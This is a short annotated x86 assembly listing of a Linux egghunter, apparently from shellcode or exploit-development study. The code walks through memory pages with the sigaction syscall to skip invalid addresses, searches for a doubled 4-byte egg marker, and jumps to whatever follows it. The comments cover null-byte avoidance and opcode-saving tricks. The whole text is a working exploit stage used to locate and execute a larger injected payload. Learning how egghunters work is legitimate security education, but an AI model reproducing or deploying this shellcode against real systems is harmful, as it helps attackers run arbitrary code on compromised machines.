






align_page:  
or cx,0xfff         ; Setup the page alignment


next_address:  
inc ecx             ; Here we are incrementing the address, aso to avoid having nullbytes in the code (writing or cx,0x1000 would produce nullbytes)

push byte 0x43      ; Here we are pushing 67 (sigaction) onto the stack. This is because it is one opcode less than xoring eax and then moving 0x43. 
pop eax             ; Set eax to 67
int 0x80            ; Make the syscall - sigaction
cmp al,0xf2         ; Did sigaction return EFAULT?
jz align_page       ; If it did it is an invalid pointer, try the next one
mov eax, 0x31676765 ; Store our Egg Key in eax
mov edi, ecx        ; Move ecx into edi (address to validate)
scasd               ; Scan string to compare eax and edi and increment edi by 4
jnz next_address    ; If it did not match try the next address
scasd               ; If it did try the next 4 bytes
jnz next_address    ; Next 4 bytes did not match try next address
jmp edi             ; We found our egg identifier, pass execution
